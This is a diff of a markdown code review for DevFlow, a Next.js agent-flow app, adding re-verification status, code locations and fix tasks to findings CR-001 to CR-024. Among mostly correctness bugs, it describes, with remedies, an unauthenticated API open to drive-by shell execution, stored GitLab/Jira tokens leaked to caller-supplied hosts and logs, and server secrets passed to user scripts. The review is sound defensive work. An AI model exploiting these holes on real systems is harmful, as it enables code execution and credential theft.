@@ -1,21 +1,47 @@
 # DevFlow code review (consolidated)
 
-- **Date:** 2026-10-31
-- **Repository:** `/Users/mihir.shah/ship` (DevFlow: Next.js 15 App Router, React 19, TypeScript strict, Tailwind v4, TanStack Query, better-sqlite3)
+- **Date:** 2026-10-31 (original review at commit `966629e`)
+- **Re-verified:** 2026-10-31 against branch `refactor/prompt-engine-inconsistency-fix` at `abaa007`. Every item now carries a "Status at `abaa007`" line, its current location, and the task that fixes it. Work is broken into ordered tasks in [`docs/review-tasks/`](review-tasks/README.md), and target conventions are in [`docs/coding-patterns.md`](coding-patterns.md).
+- **Scope policy:** only the current working flow is supported. Findings that only affect legacy or deprecated flows are marked obsolete, and their leftover code is scheduled for deletion. Security fixes are scheduled last.
+- **Repository:** DevFlow, originally reviewed at `/Users/mihir.shah/ship`. Stack: Next.js 15 App Router, React 19, TypeScript strict, Tailwind v4, TanStack Query, better-sqlite3.
 - **Scope:** the whole repository, split into eight review areas: `app/` + `loaders/` (APP), `lib/engine` core and shared `lib/` (ENG), `lib/engine/nodes` (NODE), `lib/db` + `lib/git` + `lib/integrations` (DATA), `components/flows` + `components/chat` + `hooks/` (FLOWUI), template editor/builder/templates (TPL), settings/tasks/shared/ui/constants/types (UI), and scripts/configs/docs/tooling (TOOL).
 - **Method:** one mapping agent partitioned the repo, then eight area reviewers each read every file in their area and wrote findings against AGENTS.md. All review work was read-only; the only file written is this one. This document de-duplicates cross-area overlaps, renumbers every item as `CR-NNN` (ordered by severity, then area), and keeps each original finding's content verbatim. References to original IDs inside finding text are annotated with their CR ID, e.g. `TOOL-01 (CR-0xx)`.
 - **Independence:** every CR item is scoped so it can be handed to a separate agent or PR. Where fixes interact, the item has a `Related:` line, and "fix CR-X first" marks a hard ordering.
 
 ## Baseline checks
 
+At `abaa007`:
+
 | Check | Result |
 | --- | --- |
-| `npx tsc --noEmit` | Pass, 0 errors (confirmed by every area reviewer) |
-| `npm run build` | Pass (about 30 s), but prints "Skipping linting" because `next.config.mjs` sets `eslint.ignoreDuringBuilds: true` |
-| `npm run lint` | Cannot run: `sh: eslint: command not found` (exit 127). `eslint`, `eslint-config-next` and `@eslint/eslintrc` are in `package.json` but missing from `package-lock.json` and `node_modules`; `npx eslint` fails with `ERR_MODULE_NOT_FOUND: @eslint/eslintrc`. Lint-enforced rules were therefore checked by hand. See CR-039. |
-| Tests | None exist (no `*.test.*`/`*.spec.*`, no `test` script). See CR-041. |
+| `npx tsc --noEmit` | **Fails: 11 errors in 5 files**, all in tests and scripts (`tests/plan-diff.test.ts`, `split-manager.test.ts`, `split-smoke-template.test.ts`, `plan-split-units-demo.test.ts`, `scripts/verify-prompt-parity.ts`). Vitest does not type-check, so `npm test` stays green. See CR-273. |
+| `npm run lint` | Runs: 0 errors, 143 warnings (61 `no-non-null-assertion`, 56 `no-explicit-any`, 26 `no-unused-vars`). Every warning is in `lib/` or `scripts/`, because those trees are downgraded to `warn` (CR-162). The install problem from CR-039 is fixed. |
+| `npm test` | Pass: 23 files, 252 tests (Vitest, added after the review). |
+| `npm run build` | Not re-run (the dev server was using `.next`). It still skips lint (`eslint.ignoreDuringBuilds: true`, CR-257), and its type-check covers the same files as `tsc`, so expect it to fail until CR-273 is fixed. |
+
+At review time (`966629e`): `tsc` passed, `build` passed while skipping lint, lint could not run, and there were no tests.
+
+## Status at `abaa007`
+
+| Status | Critical | High | Medium | Low | Total |
+| --- | ---: | ---: | ---: | ---: | ---: |
+| Open | 1 | 35 | 113 | 89 | 238 |
+| Partly fixed | 0 | 2 | 9 | 13 | 24 |
+| Fixed | 0 | 2 | 3 | 2 | 7 |
+| Obsolete (legacy, no fix) | 0 | 0 | 1 | 3 | 4 |
+| **Total** | 1 | 39 | 126 | 107 | 273 |
+
+Severity here is the current severity. A few items were re-rated because the code changed; each one says "was X".
+
+- **Fixed (7):** CR-018, CR-039, CR-087, CR-091, CR-125, CR-204, CR-226.
+- **Obsolete (4):** CR-158, CR-211, CR-212, CR-263. These only affect legacy data shapes or flows. Their leftover code is deleted in Tasks 07 and 08.
+- **New (5):** CR-269 to CR-273, found while re-verifying (see "Findings: New at `abaa007`"). CR-270 is High: "latest plan" reads can return plan v1 after vN was approved.
+- Large refactors landed since the review (engine moved into `runtime/`, `nodes/kinds/`, `nodes/shared/`, `harness/` and `prompts/`; the plan node rewritten around unified turns; legacy plan code deleted; Vitest added). Most findings still reproduce at their new paths.
+- Code added after `966629e` (split manager, plan node collaborators, chat panel, plan UI) was only reviewed where it overlapped an existing finding. A dedicated review of that code is still to do.
 
 ## Summary
+
+Counts below are from the original review at `966629e`.
 
 268 CR items from 284 original findings. 14 cross-area duplicate groups were merged, combining 30 original findings into 14 items (16 duplicates removed).
 
@@ -64,23 +90,15 @@ Overlaps considered but kept separate (fixes live in different code and can ship
 
 ## Suggested fix order
 
-Highest-leverage items: security criticals first, then data-loss risks, then the lint/test infrastructure that makes the remaining fixes verifiable.
+Superseded by the ordered backlog in [`docs/review-tasks/README.md`](review-tasks/README.md). The order is:
 
-1. **CR-001** [Critical] (APP-01): Critical drive-by RCE: any web page can POST to the unauthenticated API and run a shell command via `test-setup`. Add the Origin/CSRF/token middleware and bind to `127.0.0.1` before anything else.
-2. **CR-002** [High] (APP-02): Credential exfiltration: the instance test endpoints send stored GitLab/Jira tokens to a caller-supplied `baseUrl`. Pairs with CR-001.
-3. **CR-024** [High] (DATA-04): Same class of token leak, server-side: the single-instance fallback sends the GitLab token to any foreign repo host.
-4. **CR-023** [High] (DATA-03, ENG-25): Tokens persisted in plaintext in `.git/config` and echoed into events/UI; also needs existing workspace remotes cleaned.
-5. **CR-016** [High] (NODE-03): User scripts receive the server's entire `process.env` (all secrets), contradicting the allowlisted-env contract.
-6. **CR-069** [Medium] (ENG-24, DATA-08): Webhook fail-open lets anyone inject comment/pipeline events that drive paid, code-pushing agent runs.
-7. **CR-040** [High] (TOOL-02): Data-safety: `.env.example` points production at the demo DB that every `seed:*` script resets.
-8. **CR-021** [High] (DATA-01): A failed migration leaves the app running on a half-migrated schema forever; fix together with CR-022 so rebuilds are atomic and resumable.
-9. **CR-012** [High] (ENG-07, DATA-29): Add the transaction primitive (tiny) and make engine multi-writes atomic; unblocks CR-022, CR-050, CR-067, CR-066.
-10. **CR-039** [High] (TOOL-01, NODE-44): Enabling infrastructure: lint has never run on this tree. Every §5 rule item (CR-161, CR-162, CR-163, CR-166, CR-257) is inert until this lands.
-11. **CR-041** [High] (TOOL-03, DATA-25, NODE-43): Enabling infrastructure: a test runner lets the state-machine and mapper fixes below land with regression tests.
-12. **CR-014** [High] (NODE-01): Run lifecycle: cancelled/superseded runs resurrect nodes and overwrite artifacts, checklists and MR comments; do with CR-015 (attempt identity).
-13. **CR-011** [High] (ENG-06): Multi-branch poller re-triggers the pipeline gate every tick: an endless fix-agent loop with real spend.
-14. **CR-029** [High] (TPL-01): Template save silently discards edits made during a save; together with CR-030 (false success on 5xx) this is user data loss.
-15. **CR-046** [Medium] (APP-10, ENG-28): Typed errors + one route mapper; prerequisite for correct 404/409 handling in CR-114, CR-055 and the Zod work in CR-003.
+1. **Phase 0, hotfix and quality gates:** CR-270 (latest plan artifact), then green typecheck, lint, tests and build as real gates, stricter lint, the client/server boundary rules, test coverage for mappers and fixtures, DB path and seed safety, and deleting dead and legacy code together with a canonical `schema.sql`.
+2. **Phase 1, shared foundations:** typed errors, Zod at the API boundary, `db.transaction`, one `queryFn` per query key, throwing fetchers and mutation conventions. These are the primitives described in [`docs/coding-patterns.md`](coding-patterns.md).
+3. **Phase 2, engine and backend bugs:** run lifecycle, atomic node claims and attempt identity, fan-out and merge, multi-branch, graph validation, waits and poller, node config, checklist integrity, integrations, git and worktrees.
+4. **Phase 3, frontend bugs and gaps:** cockpit, template editor, settings, tasks.
+5. **Phase 4, code quality and structure:** stores and constants, `FlowEngine` split, types, thin routes, DI, shared UI, feature layout and naming.
+6. **Phase 5, docs.**
+7. **Phase 6, security (last, by owner decision):** CR-001, CR-002, CR-016, CR-023, CR-024, CR-068, CR-069, CR-100, CR-105, CR-117, CR-154, CR-176, CR-196, CR-199, CR-254, CR-264, CR-265.
 
 ## Themes
 
@@ -140,6 +158,10 @@ Each item below can be fixed independently. Severity headings group the items; w
 
 ### CR-001 [Critical] State-changing API has no auth, CSRF or Origin check, so any website can make DevFlow run shell commands
 
+- **Status at `abaa007`:** **Open**, fix in [Task 57](review-tasks/57-security-local-api-hardening.md)
+- **Current location:** (no middleware.ts at repo root); app/api/repos/test-setup/route.ts:38-75; app/api/settings/route.ts:104-178; app/api/repos/route.ts:36-62; app/api/host-instances/[host]/route.ts:14-25; app/api/task-instances/[kind]/route.ts:19-39; package.json:6,8 (`next dev` / `next start` with no `-H 127.0.0.1`)
+- **Re-verification note:** Still no session/token, Origin, Sec-Fetch-Site or Content-Type check on any state-changing route, and `/api/repos/test-setup` still passes a caller-supplied `setup_command` straight to `worktreeSetup.probe`. Add a root `middleware.ts` for `/api/:path*` that rejects non-GET requests unless the Origin matches and the body is `application/json`, plus a startup-generated local token (exempt `/api/hooks/*` and `/api/webhooks/*`), and bind dev/start to 127.0.0.1.
+
 - **Severity:** Critical
 - **Category:** Correctness
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -162,6 +184,10 @@ Each item below can be fixed independently. Severity headings group the items; w
 
 ### CR-002 [High] The instance "test" endpoints send the stored token to a caller-supplied `baseUrl`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 57](review-tasks/57-security-local-api-hardening.md)
+- **Current location:** app/api/host-instances/[host]/[id]/route.ts:29-36 (test), 6-17 (PATCH); app/api/task-instances/[kind]/[id]/route.ts:39-58 (test), 6-26 (PATCH); app/api/host-instances/[host]/route.ts:14-25; app/api/task-instances/[kind]/route.ts:19-39; lib/integrations/gitlab/git-host.ts:236-240; lib/engine/tasks/providers/jira.ts:87-98; lib/integrations/gitlab/client.ts:311-322; lib/integrations/jira/service.ts:76-93
+- **Re-verification note:** `testInstance` still pairs a caller-supplied `baseUrl` with the stored token (`input.baseUrl ?? existing.base_url`, `input.token || existing.token`) for both GitLab and Jira, so a request that sends only `{baseUrl}` ships the stored PAT or Basic credentials to any host. Reject a `baseUrl` override unless `token` is also supplied, and validate `baseUrl` with Zod (https URL) plus the SSRF guard in the add/update/test routes.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -178,6 +204,10 @@ Each item below can be fixed independently. Severity headings group the items; w
 - **Effort:** S
 
 ### CR-003 [High] No Zod validation at any API boundary, so bad bodies cause 500s or get saved
+
+- **Status at `abaa007`:** **Open**, fix in [Task 10](review-tasks/10-api-input-validation-flows.md)
+- **Current location:** raw `await req.json()` at app/api/flows/route.ts:14, app/api/flows/[id]/action/route.ts:117, app/api/flows/[id]/chat/route.ts:14, app/api/host-instances/[host]/route.ts:18, app/api/host-instances/[host]/[id]/route.ts:10, app/api/repos/route.ts:37, app/api/repos/[id]/route.ts:26-28, app/api/repos/test-setup/route.ts:39, app/api/settings/route.ts:105,134,175, app/api/task-instances/[kind]/route.ts:25, app/api/task-instances/[kind]/[id]/route.ts:11, app/api/tasks/handlers.ts:28, app/api/webhooks/gitlab/route.ts:27; cast-only bodies at app/api/flows/[id]/action/route.ts:9-34, app/api/node-templates/route.ts:30, app/api/node-templates/[id]/route.ts:15, app/api/templates/[id]/route.ts:40, app/api/templates/[id]/validate/route.ts:27, app/api/tasks/materialize/route.ts:14; lib/integrations/jira/service.ts:36
+- **Re-verification note:** Only the new split-unit actions (`parseSplitUnitBody`, action/route.ts:101-113) are Zod-validated; every listed failure still reproduces (`local_path.startsWith` 500, `String(h)` allowlist entries, `String(body.default_model)`, `input.email.trim()` on a missing email, unchecked node-template kind). Add a shared `parseJson(req, schema)` helper that returns 400, one schema per route, and a `z.discriminatedUnion("action", …)` for the action route that replaces the hand-written `ActionBody`.
 
 - **Severity:** High
 - **Category:** Correctness
@@ -203,6 +233,10 @@ Each item below can be fixed independently. Severity headings group the items; w
 
 ### CR-004 [High] The prompt preview shows a different local-mode build prompt from the one the build node sends
 
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 28](review-tasks/28-prompt-preview-parity.md)
+- **Current location:** lib/engine/nodes/kinds/build/build-node.ts:408-426 (previewPrompt) vs 245-291 (run); lib/engine/prompts/prompt-preview.ts:186-224
+- **Re-verification note:** The route now delegates to the node's own `previewPrompt`, but `BuildNode.previewPrompt` still hard-codes the old local-mode text ("First create and check out a new git branch…") while the run says the worktree is "already checked out… do not switch branches". It also resolves the branch differently (`mr_branch ?? buildBranch` vs `buildRun.branchName`) and omits the checklist and setup advisory, so `diverges` is effectively always true after a build. Extract one instructions/branch helper that both `run` and `previewPrompt` call.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -222,6 +256,10 @@ Each item below can be fixed independently. Severity headings group the items; w
 
 ### CR-005 [High] The template editor SSR seeds the shared `queryKeys.repos` cache with a different data shape
 
+- **Status at `abaa007`:** **Open**, fix in [Task 13](review-tasks/13-frontend-query-ownership.md)
+- **Current location:** app/templates/[id]/page.tsx:52-55; loaders/templates.ts:35-40; components/builder/hooks/use-editor-queries.ts:74; components/settings/context.tsx:69; components/template-editor/WebhookPayloadDialog.tsx:148
+- **Re-verification note:** The editor SSR still seeds `queryKeys.repos` with the slim `EditorRepoChoice[]` (`{id,name,local_path}`), and Settings and WebhookPayloadDialog read the same key expecting full `Repo[]`. Give the editor slice its own key (for example `queryKeys.repoChoices`) in both the page and `use-editor-queries.ts`, or seed full `Repo[]` and narrow it with `select`.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -240,6 +278,10 @@ Each item below can be fixed independently. Severity headings group the items; w
 - **Effort:** S
 
 ### CR-006 [High] Timer and comment-debounce waits are memory-only, so a restart strands `waiting` nodes forever
+
+- **Status at `abaa007`:** **Open**, fix in [Task 25](review-tasks/25-wait-timers-and-poller.md)
+- **Current location:** lib/engine/flow-engine.ts:1290-1295 (armNodeWait), 1325-1333 (bounceCommentWaits), 1895-1925 (waitTimers / processWaitTimers); lib/engine/runtime/flow-poller.ts:26-41 (start: no re-arm pass)
+- **Re-verification note:** Timer and comment-debounce deadlines still live only in the in-memory `waitTimers` Map, and nothing re-arms `waiting` nodes after a restart. The comment at 1895-1900 claims a restart re-arms "on the next join evaluation", but no code does that. Persist `wait_until` on the node row (needs schema approval and a row-mapper update), or at minimum add a startup pass in `FlowPoller.start()` that re-arms every `waiting` timer/comments node from `updated_at` plus its configured minutes.
 
 - **Severity:** High
 - **Category:** Correctness
@@ -262,6 +304,10 @@ Each item below can be fixed independently. Severity headings group the items; w
 
 ### CR-007 [High] Loop re-entry never resets `skipped` nodes, so the second iteration deadlocks on a previously skipped branch
 
+- **Status at `abaa007`:** **Open**, fix in [Task 23](review-tasks/23-graph-semantics-and-validation.md)
+- **Current location:** lib/engine/flow-engine.ts:1002-1022 (resetLoopEntry), 941-943 (statusTerminalSuccess), 1171 (startNodeStage pending guard)
+- **Re-verification note:** `resetLoopEntry` still resets and walks only `done`/`approved` nodes, so a branch that was `skipped` in iteration 1 stays `skipped`, and `startNodeStage` silently returns on the second pass. Treat `skipped` as resettable in the loop walk and add a two-iteration decision-in-loop engine test.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 2 — Engine core & shared lib
@@ -281,6 +327,10 @@ Each item below can be fixed independently. Severity headings group the items; w
 - **Effort:** S
 
 ### CR-008 [High] Merge-arena lock is per integration branch, but all branches of a parent share one working directory
+
+- **Status at `abaa007`:** **Open**, fix in [Task 20](review-tasks/20-merge-arena-and-workspaces.md)
+- **Current location:** lib/engine/runtime/fanout/merge-arena.ts:74-85 (withLock), 88-98 (ensureWorkspace), 132 (lock key), 144-155 (merge under lock), 272-281 (deleteStepBranch runs outside any lock)
+- **Re-verification note:** The lock key is still `${parentFlowId}:${integrationBranch}`, while the arena directory is one `${parentFlowId}-arena` per parent, and multi-branch plans still produce several integration branches (`integrationBranchFor(…, stepRow.branch)`). Concurrent approvals in different branch groups can therefore abort, reset or check out over each other, and the lazy clone races too. Lock on `parentFlowId` (including the lazy clone and `deleteStepBranch`), or use one arena or worktree per integration branch.
 
 - **Severity:** High
 - **Category:** Correctness
@@ -302,6 +352,10 @@ Each item below can be fixed independently. Severity headings group the items; w
 - **Effort:** S
 
 ### CR-009 [High] Fan-out rollup is not idempotent: it can publish twice and can regress an already-finished parent node
+
+- **Status at `abaa007`:** **Open**, fix in [Task 19](review-tasks/19-fanout-rollup-and-promises.md)
+- **Current location:** lib/engine/runtime/fanout/step-flow-manager.ts:544, 561-575 (onChildFinished), 578-591 (checkRollup), 603-660 (onAllResolved); lib/engine/flow-engine.ts:286-312 (finishFanout)
+- **Re-verification note:** `checkRollup` is still fired with `void` from both `advance()` and `onChildFinished()`, has no in-flight guard, and `finishFanout` does an unconditional `UPDATE nodes SET status=…`, so a concurrent call can double-publish and a post-publish child retry can push an `approved` parent back to `awaiting_approval`. In addition, `onAllResolved` calls the engine's async `finishFanout` through an interface typed `void` (step-flow-manager.ts:145, 653), so `advanceFrom` errors after fan-out are unhandled rejections. Add a per-parent in-flight Set, make the terminal write `… AND status='running'` with an early return when `changes===0`, type `finishFanout` as `Promise<void>` and await it.
 
 - **Severity:** High
 - **Category:** Correctness
@@ -327,6 +381,10 @@ Each item below can be fixed independently. Severity headings group the items; w
 
 ### CR-010 [High] `skipFanoutStep` drops the promise of async `skipStepFlow`: errors are unhandled and the API reports success
 
+- **Status at `abaa007`:** **Open**, fix in [Task 19](review-tasks/19-fanout-rollup-and-promises.md)
+- **Current location:** lib/engine/flow-engine.ts:1618-1620; lib/engine/runtime/fanout/step-flow-manager.ts:938; app/api/flows/[id]/action/route.ts:65
+- **Re-verification note:** `skipFanoutStep` is still typed `void` and drops the promise from the async `skipStepFlow`, so the route answers `{ok:true}` immediately and validation throws become unhandled rejections. Make it `async … : Promise<void> { await stepFlows.skipStepFlow(…) }`. Enabling `@typescript-eslint/no-floating-promises` would also flag the `void checkRollup` / `finishFanout` drops in CR-009.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 2 — Engine core & shared lib
@@ -344,6 +402,10 @@ Each item below can be fixed independently. Severity headings group the items; w
 - **Effort:** S
 
 ### CR-011 [High] Poller compares each branch's pipeline against the flow-wide last `pipeline` event, re-triggering the gate every tick
+
+- **Status at `abaa007`:** **Open**, fix in [Task 21](review-tasks/21-multi-branch-correctness.md)
+- **Current location:** lib/engine/runtime/flow-poller.ts:53-67 (per-branch loop), 112-139 (checkPipeline)
+- **Re-verification note:** `checkPipeline` still compares each branch's head pipeline with the flow-wide latest `pipeline` event, so two branches in different states flip-flop every tick and `triggerPipelineGate` is re-fired for the failed one whenever the gate isn't running. Scope `prev` per branch (`json_extract(data,'$.branchName') IS ?`), or track the last seen (branch, pipeline id, status), and trigger the gate only on a transition to `failed` for a new pipeline id.
 
 - **Severity:** High
 - **Category:** Correctness
@@ -365,6 +427,10 @@ Each item below can be fixed independently. Severity headings group the items; w
 - **Effort:** S
 
 ### CR-012 [High] The DB façade has no transaction API, so no multi-step write in the engine is atomic
+
+- **Status at `abaa007`:** **Open**, fix in [Task 12](review-tasks/12-db-transactions.md)
+- **Current location:** lib/db/index.ts:858-868 (get/all/run only, no transaction API); lib/engine/flow-engine.ts:95 (create), 173 (createStepChild), 546 (delete); lib/engine/runtime/fanout/step-flow-manager.ts:233 (expand); lib/engine/runtime/plan-step-store.ts:142 (replace), 207 (replaceBranch); lib/engine/templates/template-store.ts:321 (create), 337 (duplicate, hand-rolled rollback), 442 (delete), 856 (writeNodesAndEdges)
+- **Re-verification note:** There is still no `.transaction(` call anywhere in `lib/` or `app/`, so every multi-statement write (flow create, checklist replace, template graph replace, delete) can leave partial rows. Add `Database.transaction<T>(fn: () => T): T` (synchronous callback around `conn.transaction(fn)()`), wrap the listed methods in it, and remove the manual rollback in `duplicate()`.
 
 - **Severity:** High
 - **Category:** Correctness (sources: ENG-07: Correctness; DATA-29: Boundaries)
@@ -418,6 +484,10 @@ Original findings, verbatim:
 
 ### CR-013 [High] Plan-checklist bulk edit reopens done steps and drops agent `meta_id`, so the next refine duplicates the checklist
 
+- **Status at `abaa007`:** **Open**, fix in [Task 27](review-tasks/27-plan-checklist-integrity.md)
+- **Current location:** lib/engine/runtime/plan-step-store.ts:142-197 (replace), 68-129 (syncFromPlan matches only origin='agent' by meta_id)
+- **Re-verification note:** `replace()` still deletes every row and re-inserts matched rows as `status='pending'`, `origin='user'`, keeping `meta_id` only for pending rows with a `sub_flow_id`. A Plan-editor retitle therefore reopens done steps and turns agent steps into user steps, which the next refine's `syncFromPlan` then duplicates. Update matched rows in place, carrying status, completed_by, origin, meta_id and sub_flow_id, and add a store test for edit followed by `syncFromPlan`.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 2 — Engine core & shared lib
@@ -441,6 +511,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-014 [High] When the late-write guard fires, callers still finalize, which brings cancelled nodes back and overwrites state
+
+- **Status at `abaa007`:** **Open**, fix in [Task 16](review-tasks/16-run-lifecycle-late-writes.md)
+- **Current location:** lib/engine/harness/agent-runner.ts:171-182; lib/engine/nodes/shared/agent-run-node.ts:132-134 (execute); lib/engine/nodes/shared/node-definition.ts:303-321 (applyOutcome); lib/engine/nodes/kinds/plan/plan-contract.ts:236-266 (turnRetry); lib/engine/nodes/kinds/pipeline/pipeline-node.ts:599-620 (runFix); lib/engine/nodes/kinds/resolve/resolve-node.ts:166-175 (finalize resolves host comments)
+- **Re-verification note:** The late-write guard still returns `result` exactly as on success, so `execute()` runs `finalize`, then `applyOutcome` writes the final status over a cancelled node. Plan's retry path, resolve's host-side comment resolution and pipeline's fix artifact all still run. Throw a typed `RunSupersededError` (or return a discriminated result), catch it in `execute()`, the plan turn and the pipeline fix to stop with no write, and add a "still running?" check in `applyOutcome`.
 
 - **Severity:** High
 - **Category:** Correctness
@@ -470,6 +544,10 @@ Original findings, verbatim:
 
 ### CR-015 [High] Runs have no attempt identity, so overlapping attempts on one node both treat it as theirs
 
+- **Status at `abaa007`:** **Open**, fix in [Task 17](review-tasks/17-node-claim-and-attempts.md)
+- **Current location:** lib/engine/harness/agent-runner.ts:176-177; lib/engine/nodes/shared/node-support.ts:80-89 (persistRun closes every running row); lib/engine/nodes/kinds/pipeline/pipeline-node.ts:348-349; lib/engine/flow-engine.ts:1726-1746 (sendChat has no running check)
+- **Re-verification note:** Guards still check only `nodes.status === 'running'`, and there is no attempt or run-sequence identity. After cancel then retry, or a chat sent mid-run, old runs or poll loops treat the node as theirs, and `persistRun` marks a still-streaming run row as `error`. Stamp an attempt token when a node goes `running`, pass it to `executeRun` and the pipeline loop, guard on token equality, and make `sendChat` refuse when the node is already running.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -493,6 +571,10 @@ Original findings, verbatim:
 
 ### CR-016 [High] The script node passes the server's whole `process.env` to user scripts, contrary to its "allowlisted env" contract
 
+- **Status at `abaa007`:** **Open**, fix in [Task 60](review-tasks/60-security-process-and-network-isolation.md)
+- **Current location:** lib/engine/nodes/kinds/script/script-node.ts:336-345 (execa call), 254 (childEnv), 31 (doc claims allowlist)
+- **Re-verification note:** `execa` (still 10.2.1) is called with `env: opts.env` and no `extendEnv: false`, so the whole server `process.env` (Cursor key, git tokens and so on) is merged under the allowlist for every script node. Pass `extendEnv: false` and add a test asserting that a non-allowlisted variable is absent in the child.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -512,6 +594,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-017 [High] Multi-branch resolve picks up and resolves comments from every MR in the flow
+
+- **Status at `abaa007`:** **Open**, fix in [Task 21](review-tasks/21-multi-branch-correctness.md)
+- **Current location:** lib/engine/nodes/kinds/resolve/resolve-node.ts:97, 166-175; lib/engine/nodes/shared/node-support.ts:163-165 (openComments filters flow_id only); lib/engine/flow-engine.ts:2008-2010 (ingest writes mr_iid = null)
+- **Re-verification note:** The open-comment query is still flow-wide, and ingestion still stores `mr_iid` as `null`. A per-branch resolve therefore pulls other branches' comments into its prompt, calls `resolveComment` on the wrong MR, and marks them resolved locally. Store `mr_iid` on ingest (pass it from the poller's per-branch loop) and filter `openComments(flowId, mrIid)`.
 
 - **Severity:** High
 - **Category:** Correctness
@@ -533,6 +619,9 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-018 [High] A plan refine from chat drops `complex`, which wipes a complex plan's branches
+
+- **Status at `abaa007`:** **Fixed**
+- **Re-verification note:** The plan node was rewritten around unified turns (`PlanNode.chat` delegates to `turn`, see plan-node.ts:146-200): there is no `complex` flag, simple template or `parseSimple` any more, and every whole-plan apply persists `branches: plan.branches ?? []` through one schema (plan-contract.ts:281-299), so a chat refine no longer strips branches.
 
 - **Severity:** High
 - **Category:** Correctness
@@ -557,6 +646,10 @@ Original findings, verbatim:
 
 ### CR-019 [High] MR creation forces the pipeline and review nodes to `pending` even while they are running, and throws when they don't exist
 
+- **Status at `abaa007`:** **Open**, fix in [Task 21](review-tasks/21-multi-branch-correctness.md)
+- **Current location:** lib/engine/nodes/kinds/merge-request/merge-request-service.ts:124-128; lib/engine/nodes/chains/sdlc-chain.ts:72-86 (per-branch create loop)
+- **Re-verification note:** After each CR is created, `nodeByKey(flow.id, NODE_KEYS.PIPELINE/REVIEW)` is still forced to `pending`, including while it is `running`. That happens once per branch in multi-branch flows, and it throws after the MR exists when the template lacks those built-in keys. Pass the chain's resolved gate and review keys in, skip `running` nodes, and reset once after all branches' MRs exist.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -577,6 +670,10 @@ Original findings, verbatim:
 
 ### CR-020 [High] For multi-branch flows, the commit-fix agent runs on the wrong branch
 
+- **Status at `abaa007`:** **Open**, fix in [Task 21](review-tasks/21-multi-branch-correctness.md)
+- **Current location:** lib/engine/nodes/chains/sdlc-chain.ts:112-135 (runBuildCommitFix passes branchInfo: null); lib/engine/nodes/kinds/build/build-node.ts:354-382 (refine uses flowBranch / ctx.flow.mr_branch)
+- **Re-verification note:** `runBuildCommitFix` still ignores the rejected `branch` and runs the build with `branchInfo: null`, and `refine()` works on the flow's last-built `mr_branch`. A push rejection on branch A is therefore "fixed" on another branch. Pass `branchInfo: { name: branch }` when set, and have `refine()` resolve its worktree branch from `branchInfo` using the build's naming helper.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -595,6 +692,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-021 [High] DB connection is cached before schema/migrations finish — a failed migration is never retried and the app runs half-migrated
+
+- **Status at `abaa007`:** **Open**, fix in [Task 08](review-tasks/08-db-bootstrap-and-schema.md)
+- **Current location:** lib/db/index.ts:38-55
+- **Re-verification note:** `this.conn` is still assigned before `renameTicketsToTasks`, `exec(schema)` and `migrate()` run, so a failed migration leaves a cached, half-migrated handle for every later caller. Open into a local, run bootstrap and migrations, assign `this.conn` only on success, and otherwise `close()` and throw a typed `DatabaseMigrationError`.
 
 - **Severity:** High
 - **Category:** Correctness
@@ -620,6 +721,11 @@ Original findings, verbatim:
 
 ### CR-022 [High] Migrations and seeding are not atomic; table rebuilds are not resumable after a crash
 
+- **Status at `abaa007`:** **Open**, fix in [Task 08](review-tasks/08-db-bootstrap-and-schema.md)
+- **Current severity:** Medium (was High)
+- **Current location:** lib/db/index.ts:588-660 (seedTemplates, non-atomic SDLC template seed); legacy-only parts: lib/db/index.ts:64-70, 82-84, 198-208, 466-494, 547-580
+- **Re-verification note:** Still applies for the current flow only in part (b): `seedTemplates` inserts `tpl_sdlc_loop`, then its nodes and edges, as separate statements, so a crash in between makes the `hasSdlc` check permanently skip node seeding. Wrap each template seed in one transaction. Parts (a) and (c) concern legacy migrations (tickets→tasks rename, the `tasks_new`/`flows_new` FK and column rebuilds, `pipeline_fix` cleanup). That code still exists and should be deleted as a legacy cleanup task rather than hardened.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 4 — DB, git, integrations
@@ -643,6 +749,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-023 [High] GitLab token embedded in git clone/push URLs leaks into error text, the event log, `step_merges.error` and on-disk `.git/config` (local clones and merge arena)
+
+- **Status at `abaa007`:** **Open**, fix in [Task 59](review-tasks/59-security-credential-hygiene.md)
+- **Current location:** lib/integrations/gitlab/git-host.ts:188-203 (oauth2:<token>@ URL); lib/engine/ports/git-host.ts:278-282; lib/git/local.ts:57-60, 77 (clone persists token in .git/config), 161, 170 (push error message interpolated, 300 chars); lib/engine/runtime/fanout/merge-arena.ts:91-94 (arena clone), 221-258, 289-293 (errorText unredacted into step_merges.error/events)
+- **Re-verification note:** Clone and push URLs still embed `oauth2:<TOKEN>@`, which persists the token in every workspace's and arena's `.git/config`. `pushBranch` and merge-arena `errorText` still forward raw git messages and stderr into events and `step_merges.error` with no redaction. Supply credentials out of band (`GIT_CONFIG_*` `http.extraHeader` or `GIT_ASKPASS`), clone with plain URLs, add one shared redaction pass in both git wrappers, and rewrite existing `remote.origin.url`s.
 
 - **Severity:** High
 - **Category:** Correctness
@@ -694,6 +804,10 @@ Original findings, verbatim:
 
 ### CR-024 [High] Single-GitLab-instance fallback claims every repo host and sends the GitLab token to foreign hosts
 
+- **Status at `abaa007`:** **Open**, fix in [Task 59](review-tasks/59-security-credential-hygiene.md)
